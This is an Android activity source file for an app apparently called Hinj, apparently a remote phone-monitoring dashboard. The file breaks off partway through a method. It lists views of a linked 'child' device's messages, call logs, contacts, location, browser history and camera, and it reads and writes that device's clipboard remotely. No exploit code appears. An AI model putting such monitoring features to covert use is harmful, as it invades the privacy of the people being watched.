package com.hinj.app.activity;

import garin.artemiy.quickaction.library.QuickAction;

import java.lang.reflect.Method;
import java.net.URLDecoder;
import java.util.ArrayList;
import java.util.Stack;

import org.json.JSONArray;
import org.json.JSONObject;

import android.annotation.SuppressLint;
import android.app.ActionBar;
import android.app.Dialog;
import android.app.NotificationManager;
import android.app.ProgressDialog;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.Configuration;
import android.content.res.TypedArray;
import android.graphics.Color;
import android.graphics.drawable.ColorDrawable;
import android.net.Uri;
import android.os.AsyncTask;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.support.v4.app.ActionBarDrawerToggle;
import android.support.v4.app.Fragment;
import android.support.v4.app.FragmentActivity;
import android.support.v4.app.FragmentManager;
import android.support.v4.app.FragmentTransaction;
import android.support.v4.view.ViewPager.LayoutParams;
import android.support.v4.widget.DrawerLayout;
import android.text.SpannableString;
import android.text.style.ForegroundColorSpan;
import android.util.Log;
import android.view.KeyEvent;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.View.OnClickListener;
import android.view.Window;
import android.view.inputmethod.EditorInfo;
import android.view.inputmethod.InputMethodManager;
import android.widget.AdapterView;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.ListView;
import android.widget.TextView;
import android.widget.TextView.OnEditorActionListener;
import android.widget.Toast;

import com.hinj.app.activity.fragement.AboutFragment;
import com.hinj.app.activity.fragement.AccountFragment;
import com.hinj.app.activity.fragement.AppsFragment;
import com.hinj.app.activity.fragement.BrowserHistoryFragment;
import com.hinj.app.activity.fragement.CallLogDetailFragment;
import com.hinj.app.activity.fragement.CallLogsFragment;
import com.hinj.app.activity.fragement.CallLogsFragment.CallLogFragment;
import com.hinj.app.activity.fragement.CameraCaptureFragment;
import com.hinj.app.activity.fragement.ContactUpdateFragment;
import com.hinj.app.activity.fragement.ContactsFragment;
import com.hinj.app.activity.fragement.CotactDetailFragment;
import com.hinj.app.activity.fragement.DeviceImagesListFragment;
import com.hinj.app.activity.fragement.DeviceMusicListFragment;
import com.hinj.app.activity.fragement.DeviceVideoListFragment;
import com.hinj.app.activity.fragement.FileDetailFragment;
import com.hinj.app.activity.fragement.FilesFragmentBottomBar;
import com.hinj.app.activity.fragement.FilesFragment;
import com.hinj.app.activity.fragement.HomeFragment;
import com.hinj.app.activity.fragement.InstallAppsFragment;
import com.hinj.app.activity.fragement.LocateDeviceFragment;
import com.hinj.app.activity.fragement.MessageDetailFragment;
import com.hinj.app.activity.fragement.MessageFragment;
import com.hinj.app.activity.fragement.MusicFragment;
import com.hinj.app.activity.fragement.MusicListFragment;
import com.hinj.app.activity.fragement.PhotoDetatilFragment;
import com.hinj.app.activity.fragement.PhotoFullViewFragment;
import com.hinj.app.activity.fragement.PhotosFragment;
import com.hinj.app.activity.fragement.SettingsFragment;
import com.hinj.app.activity.fragement.VideoDetailFragment;
import com.hinj.app.activity.fragement.VideoViewFragment;
import com.hinj.app.activity.fragement.VideosFragment;
import com.hinj.app.adapter.NavDrawerListAdapter;
import com.hinj.app.model.NavDrawerItem;
import com.hinj.app.utils.AppUtils;
import com.hinj.app.utils.HinjAppPreferenceUtils;
import com.hinj.app.utils.RequestPost;
import com.hinj.asynctask.ClipboardAsyncTask;
import com.hinj.parsing.HingAppParsing;
import com.hinj.secure.smsgps.CallNonRBackgroundService;
import com.hinj.secure.smsgps.DataCountUpdateService;

public class DashBoardActivity extends FragmentActivity implements OnClickListener, CallLogFragment {
	private DrawerLayout mDrawerLayout;
	private ListView mDrawerList;
	private ActionBarDrawerToggle mDrawerToggle;
	private EditText input;

	// nav drawer title
	private CharSequence mDrawerTitle;

	// used to store app title
	private CharSequence mTitle;

	// slide menu items
	private String[] navMenuTitles;
	private TypedArray navMenuIcons;
//	private static boolean onBack = false;

	private ArrayList<NavDrawerItem> navDrawerItems;
	private NavDrawerListAdapter adapter;
	
	public static ActionBar bar;
	
	private LinearLayout bottomMenuFileTab,bottomMenuClipboardTab,bottomMenuUrlTab,bottomMenuAppTab;
	private LinearLayout bottom_LL;

	public static Stack<Fragment> fragmentStack;
	private CallLogsFragment callLogsFragment;  
	private FragmentManager fragmentManager; 
	public static Context mContext;
	public Bundle savedInstanceState;
	
	private QuickAction popupClipboardQuickAction,popupUrlQuickAction ;
	public EditText popup_layout_bottombar_url_editText,popup_layout_bottombar_clipboard_editText;
	private Button buttonGo,buttonCopy,buttonPaste;
	private TextView clipboard_textView;
	  
	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		this.savedInstanceState = savedInstanceState;
		setContentView(R.layout.activity_dashboard);
		
		initPopUps();
		
		setPopupClickListeners();
		
		try {
			runOnUiThread(new Runnable() {
				
				@Override
				public void run() {
					DataCountUpdateService.start(DashBoardActivity.this);
				}
			});
			
		} catch (Exception e) {
			e.printStackTrace();
		}
		
		mContext = DashBoardActivity.this;
		
		bar = getActionBar();
		bar.setBackgroundDrawable(new ColorDrawable(Color.parseColor("#cc3333")));
		bar.setIcon(R.drawable.icon_navbar);
		
		mTitle = mDrawerTitle = getTitle();
		
		// load slide menu items
		navMenuTitles = getResources().getStringArray(R.array.nav_drawer_items);
		
		// nav drawer icons from resources
		navMenuIcons = getResources().obtainTypedArray(R.array.nav_drawer_icons);

		mDrawerLayout = (DrawerLayout) findViewById(R.id.drawer_layout);
		mDrawerList = (ListView) findViewById(R.id.list_slidermenu);

		navDrawerItems = new ArrayList<NavDrawerItem>();
		
		fragmentStack = new Stack<Fragment>();

		// adding nav drawer items to array
		// Home
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[0], navMenuIcons.getResourceId(0, -1)));
		// Find People
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[1], navMenuIcons.getResourceId(1, -1)));
		// Photos
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[2], navMenuIcons.getResourceId(2, -1)));
		// Communities, Will add a counter here
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[3], navMenuIcons.getResourceId(3, -1)));
		// Pages
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[4], navMenuIcons.getResourceId(4, -1)));
		// What's hot, We  will add a counter here
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[5], navMenuIcons.getResourceId(5, -1)));
		
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[6], navMenuIcons.getResourceId(6, -1)));
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[7], navMenuIcons.getResourceId(7, -1)));
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[8], navMenuIcons.getResourceId(8, -1)));
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[9], navMenuIcons.getResourceId(9, -1)));
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[10], navMenuIcons.getResourceId(10, -1)));
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[11], navMenuIcons.getResourceId(11, -1)));
		navDrawerItems.add(new NavDrawerItem(navMenuTitles[12], navMenuIcons.getResourceId(12, -1)));

		// Recycle the typed array
		navMenuIcons.recycle();

		mDrawerList.setOnItemClickListener(new SlideMenuClickListener());

		// setting the nav drawer list adapter
		adapter = new NavDrawerListAdapter(getApplicationContext(), navDrawerItems);
		mDrawerList.setAdapter(adapter);

		// enabling action bar app icon and behaving it as toggle button
		getActionBar().setDisplayHomeAsUpEnabled(true);
		getActionBar().setHomeButtonEnabled(true);
		getActionBar().setTitle("");
		mDrawerToggle = new ActionBarDrawerToggle(this, mDrawerLayout,
				R.drawable.ic_drawer, //nav menu toggle icon  // ic_drawer  // icon_right_menu
				R.string.blank, // nav drawer open - description for accessibility
				R.string.blank // nav drawer close - description for accessibility
		) {
			public void onDrawerClosed(View view) {
				//getActionBar().setTitle(mTitle);
				// calling onPrepareOptionsMenu() to show action bar icons
				invalidateOptionsMenu();
			}

			public void onDrawerOpened(View drawerView) {
				//getActionBar().setTitle(mDrawerTitle);
				
				// calling onPrepareOptionsMenu() to hide action bar icons
				invalidateOptionsMenu();
			}
		};
		mDrawerLayout.setDrawerListener(mDrawerToggle);
		
		bottomMenuFileTab = (LinearLayout)findViewById(R.id.bottom_file_menu_filetab);
		bottomMenuClipboardTab = (LinearLayout)findViewById(R.id.bottom_file_menu_clipboardtab);
		bottomMenuUrlTab = (LinearLayout)findViewById(R.id.bottom_file_menu_urltab);
		bottomMenuAppTab = (LinearLayout)findViewById(R.id.bottom_file_menu_apptab);
		
		bottom_LL = (LinearLayout)findViewById(R.id.bottom_LL);
		
		bottomMenuFileTab.setOnClickListener(this);
		bottomMenuClipboardTab.setOnClickListener(this);
		bottomMenuUrlTab.setOnClickListener(this);
		bottomMenuAppTab.setOnClickListener(this);
		
		if (savedInstanceState == null) {
			// on first time display view for first nav item
			displayView(0);
		}
	}
	
	private void initPopUps() {

		LinearLayout popupBottombarClipboardLayout = (LinearLayout) getLayoutInflater().inflate(R.layout.popup_layout_bottombar_clipboard, null);
		LinearLayout.LayoutParams layoutParams =  new LinearLayout.LayoutParams(LayoutParams.MATCH_PARENT,LayoutParams.WRAP_CONTENT);
		popupBottombarClipboardLayout.setLayoutParams(layoutParams);
		
		LinearLayout popupBottombarUrlLayout = (LinearLayout) getLayoutInflater().inflate(R.layout.popup_layout_bottombar_url, null);
		popupBottombarUrlLayout.setLayoutParams(layoutParams);
		
		buttonGo = (Button) popupBottombarUrlLayout.findViewById(R.id.popup_layout_bottombar_url_buttonGo);
		
		buttonCopy = (Button) popupBottombarClipboardLayout.findViewById(R.id.popup_layout_bottombar_clipboard_buttonCopy);
		buttonPaste = (Button) popupBottombarClipboardLayout.findViewById(R.id.popup_layout_bottombar_clipboard_buttonPaste);
		
		popup_layout_bottombar_url_editText = (EditText) popupBottombarUrlLayout.findViewById(R.id.popup_layout_bottombar_url_editText);
		popup_layout_bottombar_clipboard_editText  = (EditText) popupBottombarClipboardLayout.findViewById(R.id.popup_layout_bottombar_clipboard_editText);
		
		clipboard_textView = (TextView) popupBottombarUrlLayout.findViewById(R.id.clipboard_textView);
		
		popupClipboardQuickAction = new QuickAction(this, R.style.PopupAnimation, popupBottombarClipboardLayout);
		popupUrlQuickAction = new QuickAction(this, R.style.PopupAnimation, popupBottombarUrlLayout);
		
	}

	private void setPopupClickListeners() {
		
		buttonGo.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				
				String browse_url = popup_layout_bottombar_url_editText.getText().toString().trim();
				new SetBrowseUrlAsynctask(browse_url).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
				/*try {
					String browse_url = popup_layout_bottombar_url_editText.getText().toString().trim();
					openBrowser("http://"+browse_url);
				} catch (Exception e) {
					e.printStackTrace();
					Toast.makeText(DashBoardActivity.this, "Please input proper url",Toast.LENGTH_SHORT).show();
				}*/
			}
		});

		buttonCopy.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				
				String clipText = popup_layout_bottombar_clipboard_editText.getText().toString().trim();
				ClipboardManager myClipboard = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
				myClipboard.setText(clipText);
				//new GetClipBoardTextAsynctask().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
				//Toast.makeText(DashBoardActivity.this,"Copy", Toast.LENGTH_SHORT).show();
			}
		});
 
		buttonPaste.setOnClickListener(new OnClickListener() {

			@Override
			public void onClick(View v) {
				
				String clipText = popup_layout_bottombar_clipboard_editText.getText().toString().trim();
				
				if(!clipText.equalsIgnoreCase(""))
				{
					new SetClipBoardTextAsynctask(clipText).execute();
				}
				
				//Toast.makeText(DashBoardActivity.this,"Paste",  Toast.LENGTH_SHORT).show();
				//new GetClipBoardTextAsynctask().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
				
			}
		});
		
		popup_layout_bottombar_url_editText.setOnEditorActionListener(new OnEditorActionListener() {
			public boolean onEditorAction(TextView v, int actionId, KeyEvent event) {
				if ((event != null && (event.getKeyCode() == KeyEvent.KEYCODE_ENTER)) || (actionId == EditorInfo.IME_ACTION_DONE)) {
					try {
						String browse_url = popup_layout_bottombar_url_editText.getText().toString().trim();
						new SetBrowseUrlAsynctask(browse_url).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
					} catch (Exception e) {
						e.printStackTrace();
						Toast.makeText(DashBoardActivity.this, "Please input proper url",Toast.LENGTH_SHORT).show();
					}
				} 
				return false;    
			}
	    });
		
	}
	
	@Override
	public void onClick(View view) {
		if(view == bottomMenuFileTab){
			
			FilesFragmentBottomBar mFilesFragment = new FilesFragmentBottomBar();
			Bundle bunldeObj = new Bundle();
			bunldeObj.putString("position", "4");
			DashBoardActivity.replaceFragementsClick(mFilesFragment, bunldeObj,"Files");
		//	Toast.makeText(DashBoardActivity.this, "bottomMenuFileTab", 1).show();
		}
		if(view == bottomMenuClipboardTab){
			//Toast.makeText(DashBoardActivity.this, "bottomMenuClipboardTab", 1).show();
			new GetClipBoardTextAsynctask(view).executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
		//	popupClipboardQuickAction.show((View)view.getParent(),bottom_LL);
		//	new GetClipBoardTextAsynctask().executeOnExecutor(AsyncTask.THREAD_POOL_EXECUTOR);
			
		}
		if(view == bottomMenuUrlTab){
			//Toast.makeText(DashBoardActivity.this, "bottomMenuUrlTab", 1).show();
			popupUrlQuickAction.show((View)view.getParent(),bottom_LL);
			
			/*try {
				String browse_url = popup_layout_bottombar_url_editText.getText().toString().trim();
				openBrowser("http://"+browse_url);
			} catch (Exception e) {
				e.printStackTrace();
				Toast.makeText(DashBoardActivity.this, "Please input proper url",Toast.LENGTH_SHORT).show();
			}*/
		}
		if(view == bottomMenuAppTab){
			
			AppsFragment mAppsFragment = new AppsFragment();
			Bundle bunldeObj = new Bundle();
			bunldeObj.putString("position", "4");
			DashBoardActivity.replaceFragementsClick(mAppsFragment, bunldeObj,"Files");
		}
	}
	/**
	 * Slide menu item click listener
	 * */
	private class SlideMenuClickListener implements
			ListView.OnItemClickListener {
		@Override
		public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
			// display view for selected nav drawer item
			displayView(position);
		}
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		getMenuInflater().inflate(R.menu.main, menu);
		
		for(int i = 0; i < menu.size(); i++) {
	        MenuItem item = menu.getItem(i);
	        SpannableString spanString = new SpannableString(menu.getItem(i).getTitle().toString());
	        spanString.setSpan(new ForegroundColorSpan(Color.WHITE), 0, spanString.length(), 0); //fix the color to white
	        item.setTitle(spanString);
	    }
		
		return super.onCreateOptionsMenu(menu);
	}

	@Override
	public boolean onMenuOpened(int featureId, Menu menu)
	{
	    if(featureId == Window.FEATURE_ACTION_BAR && menu != null){
	        if(menu.getClass().getSimpleName().equals("MenuBuilder")){
	            try{
	                Method m = menu.getClass().getDeclaredMethod(
	                    "setOptionalIconsVisible", Boolean.TYPE);
	                m.setAccessible(true);
	                m.invoke(menu, true);
	            }
	            catch(NoSuchMethodException e){
	                Log.e("", "onMenuOpened", e);
	            }
	            catch(Exception e){
	                throw new RuntimeException(e);
	            }
	        }
	    }
	    return super.onMenuOpened(featureId, menu);
	}
	
	@Override
	public boolean onOptionsItemSelected(MenuItem item) {
		// toggle nav drawer on selecting action bar app icon/title
		if (mDrawerToggle.onOptionsItemSelected(item)) {
			return true;
		}
		// Handle action bar actions click
		switch (item.getItemId()) {
		case R.id.action_settings:
			//displayView(12);
			
			SettingsFragment mSettingsFragment  = new SettingsFragment();
			Bundle bunldeObj = new Bundle();
			bunldeObj.putString("position", "4");
			
			DashBoardActivity.replaceFragementsClick(mSettingsFragment, bunldeObj,"Settings");
			return true;
	
		case R.id.action_about:
			//displayView(14);
			openDialog();
			
			/*AboutFragment mAboutFragment  = new AboutFragment();
			Bundle bunldeObj3 = new Bundle();
			bunldeObj3.putString("position", "5");
			
			DashBoardActivity.replaceFragementsClick(mAboutFragment, bunldeObj3,"About");*/
			return true;
		case R.id.action_share:
			//displayView(13);
			/*ShareFragment mShareFragment  = new ShareFragment();
			Bundle bunldeObj2 = new Bundle();
			bunldeObj2.putString("position", "5");
			DashBoardActivity.replaceFragementsClick(mShareFragment, bunldeObj2,"Share");*/
			
			Intent intent = new Intent(Intent.ACTION_SEND);
			intent.setType("text/plain");
			intent.putExtra(Intent.EXTRA_TEXT, "www.google.com");  
			startActivity(Intent.createChooser(intent, "Share with"));
			    
			return true;
		case R.id.action_exit:
			exitApp();
			return true;
		case R.id.title:
			disconnect();
			return true;
		default:
			return super.onOptionsItemSelected(item);
		}
	}
	
	
	public void openDialog() {
		Dialog dialog = new Dialog(DashBoardActivity.this);
		dialog.setContentView(R.layout.dialogbrand_layout);
		dialog.setTitle("About");
		dialog.show();
		}
	
	/* *
	 * Called when invalidateOptionsMenu() is triggered
	 */
	@Override
	public boolean onPrepareOptionsMenu(Menu menu) {
		// if nav drawer is opened, hide the action items
		boolean drawerOpen = mDrawerLayout.isDrawerOpen(mDrawerList);
		//menu.findItem(R.id.action_settings).setVisible(!drawerOpen);
		return super.onPrepareOptionsMenu(menu);
	}

	/**
	 * Diplaying fragment view for selected nav drawer list item
	 * */
	private void displayView(int position) {
		// update the main content by replacing fragments
		Fragment fragment = null;
		switch (position) {
		case 0:
			fragment = new HomeFragment();
			break;
		case 1:
			fragment = new MessageFragment();
			break;
		case 2:
			fragment = new InstallAppsFragment();
			break;
		case 3:
			fragment = new FilesFragment();
			break;
		case 4:
			fragment = new PhotosFragment();
			break;
		case 5:
			fragment = new MusicFragment();
			break;
		case 6:
			fragment = new VideosFragment();
			break;
		case 7:
			fragment = new CallLogsFragment();
			break;
		case 8:
			fragment = new ContactsFragment();
			break;
		case 9:
			fragment = new LocateDeviceFragment();
			break;
		case 10:
			fragment = new BrowserHistoryFragment();
			break;
		case 11:
			fragment = new CameraCaptureFragment();
			break;
		case 12:
			if (!HinjAppPreferenceUtils.getRaId(DashBoardActivity.this).equalsIgnoreCase("")) {
				fragment = new AccountFragment();
			}else {
				Intent intent = new Intent(DashBoardActivity.this,LoginActivity.class);
				intent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP);
				startActivity(intent);
				DashBoardActivity.this.finish();
			}
			break;
		
		default:
			break;
		}
		if (fragment != null) {
			try {
				fragmentStack.push(fragment);
			} catch (Exception e) {
				e.printStackTrace();
			}
			
			FragmentManager fragmentManager = getSupportFragmentManager();
			fragmentManager.beginTransaction().replace(R.id.frame_container, fragment).commit();

			// update selected item and title, then close the drawer
			mDrawerList.setItemChecked(position, true);
			mDrawerList.setSelection(position);
			setTitle(navMenuTitles[position]);
			mDrawerLayout.closeDrawer(mDrawerList);
		} else {
			// error in creating fragment
			Log.e("MainActivity", "Error in creating fragment");
		}
		
	}
	
	public void exitApp()
	{
		/*finish();
        System.exit(0);
        android.os.Process.killProcess(android.os.Process.myPid());*/
		    cancelNotification(DashBoardActivity.this);
		 	finish();
		    Intent intent = new Intent(Intent.ACTION_MAIN);
		    intent.addCategory(Intent.CATEGORY_HOME);
		    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		    startActivity(intent);

		    /*int pid = android.os.Process.myPid();=====> use this if you want to kill your activity. But its not a good one to do.
		    android.os.Process.killProcess(pid);*/
	}
	
	public static void cancelNotification(Context ctx) {
	    String ns = Context.NOTIFICATION_SERVICE;
	    NotificationManager nMgr = (NotificationManager) ctx.getSystemService(ns);
	    nMgr.cancelAll();
	}
	
	public void disconnect()
	{
		this.finish();
	}
	
	public static void replaceFragementsClick(Fragment fragementObj, Bundle bundleObj, String title){
		try {
			FragmentManager fragmentManager = ((FragmentActivity) mContext).getSupportFragmentManager();
		    if (fragementObj != null) {
		    	
		    	//bar.setTitle(title);
		    	
		    	fragementObj.setArguments(bundleObj);
				fragmentManager.beginTransaction().replace(R.id.frame_container, fragementObj).commit();
			} 
//		    if (!onBack) {
//		    	onBack = false;
		    	DashBoardActivity.fragmentStack.push(fragementObj);
//			}else {
//				onBack = false;
//			}
		    
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	public static void replaceFragementsClickBack(Fragment fragementObj, Bundle bundleObj, String title){
		try {
			FragmentManager fragmentManager = ((FragmentActivity) mContext).getSupportFragmentManager();
		    if (fragementObj != null) {
		    	
		    	//bar.setTitle(title);
		    	
		    	fragementObj.setArguments(bundleObj);
				fragmentManager.beginTransaction().replace(R.id.frame_container, fragementObj).commit();
				
				DashBoardActivity.fragmentStack.pop();
			} 
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
	
	@Override
	public void onItemClickedListener(String valueClicked) {

		Toast.makeText(this, valueClicked, Toast.LENGTH_LONG).show();
		CallLogDetailFragment logDetailFragment;
		
		FragmentManager fragmentManager = getSupportFragmentManager();
		FragmentTransaction ft = fragmentManager.beginTransaction(); 

		logDetailFragment = new CallLogDetailFragment();
		fragmentStack.lastElement().onPause();
		ft.hide(fragmentStack.lastElement());
		ft.commit();
		
	}
	
	@Override
	public void setTitle(CharSequence title) {
//		mTitle = title;
//		getActionBar().setTitle(mTitle);
	}

	/**
	 * When using the ActionBarDrawerToggle, you must call it during
	 * onPostCreate() and onConfigurationChanged()...
	 */

	@Override
	protected void onPostCreate(Bundle savedInstanceState) {
		super.onPostCreate(savedInstanceState);
		// Sync the toggle state after onRestoreInstanceState has occurred.
		mDrawerToggle.syncState();
	}

	@Override
	public void onConfigurationChanged(Configuration newConfig) {
		super.onConfigurationChanged(newConfig);
		// Pass any configuration change to the drawer toggls
		mDrawerToggle.onConfigurationChanged(newConfig);
		
		  // Checks whether a hardware keyboard is available
	    if (newConfig.hardKeyboardHidden == Configuration.HARDKEYBOARDHIDDEN_NO) {
	    	//popupClipboardQuickAction.show((View)popup_layout_bottombar_clipboard_editText.getParent(),bottom_LL);
	    	popupClipboardQuickAction.nayaMethod(bottom_LL);
	        Toast.makeText(this, "keyboard visible", Toast.LENGTH_SHORT).show();
	    } else if (newConfig.hardKeyboardHidden == Configuration.HARDKEYBOARDHIDDEN_YES) {
	    	popupClipboardQuickAction.bilkulnayaMethod(bottom_LL);
	    	//popupClipboardQuickAction.show((View)popup_layout_bottombar_clipboard_editText.getParent(),bottom_LL);
	        Toast.makeText(this, "keyboard hidden", Toast.LENGTH_SHORT).show();
	    }
	}
	
	@Override
	public void onBackPressed() {
			/**
			 * Do Current Fragment Pop
			 * */			
			fragmentStack.pop();			
			
			if(fragmentStack.size() >0){
				
				Bundle bunldeObj = new Bundle();
				//******Exit from Current Fragment
				Fragment fragment = fragmentStack.pop();	
//				fragmentStack.push(fragment);
				if(fragment instanceof PhotosFragment){
					bunldeObj.putString("position", "4");				
					replaceFragementsClick(fragment,bunldeObj,"Photos");
				}else if(fragment instanceof PhotoDetatilFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Photos");
				}else if(fragment instanceof PhotoFullViewFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Photos");
				}else if(fragment instanceof HomeFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Home");
				}else if(fragment instanceof VideosFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Videos");
				}else if(fragment instanceof VideoDetailFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Videos");
				}else if(fragment instanceof VideoViewFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Videos");
				}else if(fragment instanceof MusicFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Music");
				}else if(fragment instanceof MusicListFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Music");
				}else if(fragment instanceof InstallAppsFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Apps");
				}else if(fragment instanceof MessageFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Messages");
				}else if(fragment instanceof MessageDetailFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Messages");
				}else if(fragment instanceof LocateDeviceFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Locate Device");
				}else if(fragment instanceof FilesFragmentBottomBar){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Files");
				}else if(fragment instanceof AppsFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Apps");	
				}else if(fragment instanceof FileDetailFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Files");
				}else if(fragment instanceof ContactsFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Contacts");
				}else if(fragment instanceof CotactDetailFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Contacts");
				}else if(fragment instanceof ContactUpdateFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Contacts");
				}else if(fragment instanceof CallLogsFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Calls");
				}else if(fragment instanceof CallLogDetailFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Calls");
				}else if(fragment instanceof BrowserHistoryFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Browser History");
				}else if(fragment instanceof AccountFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Account");
				}
				else if(fragment instanceof CameraCaptureFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Camera Capture");
				}
				else if(fragment instanceof DeviceImagesListFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Photos");
				}
				else if(fragment instanceof DeviceMusicListFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Music");
				}
				else if(fragment instanceof DeviceVideoListFragment){
					bunldeObj.putString("position", "4");
					replaceFragementsClick(fragment,bunldeObj,"Video");
				}
				
				
//				onBack = true;
			}else {
				super.onBackPressed();
				
				Intent intent = new Intent(DashBoardActivity.this,ConnectDeviceActivity.class);
				startActivity(intent);
				finish();
		}
	}
	
	public class GetClipBoardTextAsynctask extends AsyncTask<String, String,Object[]> {
		
		ProgressDialog progressDialog ;
		String response = "";
		View view;
		
		public GetClipBoardTextAsynctask(View view) {
			this.view = view;
		}

		@Override
		public void onPreExecute() {
			progressDialog = ProgressDialog.show(DashBoardActivity.this,"Loading...", "Please Wait");
		}

		@Override
		public Object[] doInBackground(String... params) {
			
			return HingAppParsing.getClipBoardText(DashBoardActivity.this, HinjAppPreferenceUtils.getChildUploadDeviceId(DashBoardActivity.this),
								HinjAppPreferenceUtils.getChildRaId(DashBoardActivity.this)); 
		}  
 
		@Override
		public void onPostExecute(Object[] result) {
			progressDialog.cancel();
			try
			{
				System.out.println("result "+result);
				boolean status = (Boolean) result[0];
				response = (String) result[1];
				
				if(status)
				{
					/*ClipboardManager myClipboard = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
					myClipboard.setText(response);*/
					
				//	popup_layout_bottombar_clipboard_editText.setText(response);
				}
				else
				{
					response = (String) result[1];
					//AppUtils.showDialog(DashBoardActivity.this, response);
				}
				
				popupClipboardQuickAction.show((View)view.getParent(),bottom_LL);
				popup_layout_bottombar_clipboard_editText.setText(response);
				
			}catch (Exception e) {
				e.printStackTrace();
			}
		}
	} 
	
	
	public class SetBrowseUrlAsynctask extends AsyncTask<String, String,Object[]> {
		
		ProgressDialog progressDialog ;
		String response = "", url="";
		String android_id = Secure.getString(DashBoardActivity.this.getContentResolver(),Secure.ANDROID_ID);
		
		public SetBrowseUrlAsynctask(String browse_url) {
			this.url = browse_url;
		}

		@Override
		public void onPreExecute() {
			progressDialog = ProgressDialog.show(DashBoardActivity.this,"Loading...", "Please Wait");
		}

		@Override
		public Object[] doInBackground(String... params) {
			
			return HingAppParsing.setBrowserUrl(DashBoardActivity.this, android_id, url);
		}  
 
		@Override
		public void onPostExecute(Object[] result) {
			progressDialog.cancel();
			try
			{
				System.out.println("result "+result);
				boolean status = (Boolean) result[0];
				response = (String) result[1];
				
				if(status)
				{
					/*ClipboardManager myClipboard = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
					myClipboard.setText(response);*/
					
				//	popup_layout_bottombar_clipboard_editText.setText(response);
				}
				else
				{
					response = (String) result[1];
					//AppUtils.showDialog(DashBoardActivity.this, response);
				}
				
				hideKeyboard();
			}catch (Exception e) {
				e.printStackTrace();
			}
		}
	} 
	
	/**
	 * posting data on server
	 */
	public class SetClipBoardTextAsynctask extends AsyncTask<String, String,Object[]> {
		
		ProgressDialog progressDialog ;
		String response = "";
		String clipText;
		
		public SetClipBoardTextAsynctask(String clipText) {
			this.clipText = clipText;
		}

		@Override
		public void onPreExecute() {
			progressDialog = ProgressDialog.show(DashBoardActivity.this,"Loading...", "Please Wait");
		}

		@Override
		public Object[] doInBackground(String... params) {
			
			return HingAppParsing.setClipBoardText(DashBoardActivity.this, HinjAppPreferenceUtils.getChildUploadDeviceId(DashBoardActivity.this),
													clipText); 
		}  
 
		@Override
		public void onPostExecute(Object[] result) {
			progressDialog.cancel();
			try
			{
				System.out.println("result "+result);
				boolean status = (Boolean) result[0];
				response = (String) result[1];
				
				if(status)
				{
					/*ClipboardManager myClipboard = (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);
					myClipboard.setText(response);*/
					
				//	popup_layout_bottombar_clipboard_editText.setText(response);
				}
				else
